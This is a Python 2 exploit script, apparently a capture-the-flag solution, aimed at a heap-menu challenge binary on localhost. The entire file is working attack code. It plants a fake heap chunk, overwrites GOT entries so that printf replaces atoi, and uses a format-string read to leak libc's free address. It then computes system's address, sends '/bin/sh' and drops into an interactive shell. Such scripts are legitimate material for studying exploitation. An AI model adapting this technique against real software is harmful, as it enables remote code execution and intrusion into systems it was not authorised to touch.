import socket, struct, telnetlib, functools, time


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def debug(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        print '{}: {} {}'.format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


@debug
def new(size, content, name):
    read_until(f, 'Your choice:')
    f.write('1\n')

    read_until(f, 'Size :')
    f.write(str(size) + '\n')

    read_until(f, 'Content:')
    f.write(content + '\n')

    read_until(f, 'Name:')
    if len(name) == 8:
        f.write(name)
    else:
        f.write(name + '\n')


@debug
def delete():
    read_until(f, 'Your choice:')
    f.write('2\n')


@debug
def edit(content):
    read_until(f, 'Your choice:')
    f.write('3  ')

    read_until(f, 'Content:')
    f.write(content + '\n')


def exit(select):
    read_until(f, 'Your choice:')
    f.write('4\n')

    read_until(f, '/n)')
    f.write(select)


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


s, f = sock("127.0.0.1", 4088)

addr = dict()

# fill up stdio buffer and put fake size for following fake chunk at the end
buf  = 'nn'
buf += '\x00'*(0x1000-0x18-len(buf))
buf += p64(0x50)
print hex(len(buf))
exit(buf)

#         size of the following chunk after the fake chunk
new(0x20, p64(0x0) + p64(0x18), 'BBBBBBBB')
delete()

addr['got_exit'] = 0x602020

buf = ''
buf += 'C' * 0x30
buf += p64(addr['got_exit'])
new(0x48, buf, 'DDDD')


addr['got_free'] = 0x602018 
addr['plt_alarm'] = 0x400790
addr['plt_read'] = 0x4007a0
addr['plt_printf'] = 0x400780
addr['plt_puts'] = 0x400760

buf = ''
buf += p64(addr['plt_alarm'])
buf += p64(addr['plt_read'])
buf += p64(addr['plt_puts']+6)
buf += p64(0xdeadbeaf)
buf += p64(addr['plt_printf']+6)
buf += p64(addr['plt_alarm']+6)
buf += p64(addr['plt_read']+6)
buf += p64(0xdeadbeaf)
buf += p64(0xdeadbeaf)
buf += p64(0xdeadbeaf)
buf += p64(0xdeadbeaf)
buf += p64(addr['plt_printf'])

# Now we can edit addr['got_free']
edit(buf)

read_until(f, 'Your choice:')
# printf is called instead of atoi
f.write('%9$s!!'.ljust(8, '\x00') + p64(addr['got_free']))

addr['libc_free'] = u64(read_until(f, '!!')[:-2].ljust(8, '\x00'))
addr['libc'] = addr['libc_free'] - 0x844f0
addr['libc_system'] = addr['libc'] + 0x45390
print '[+] addr_libc = {}'.format(hex(addr['libc']))


buf = buf[:-8]
buf += p64(addr['libc_system'])

edit(buf)


read_until(f, 'Your choice:')
# printf is called instead of atoi
f.write('/bin/sh\x00')


shell(s)
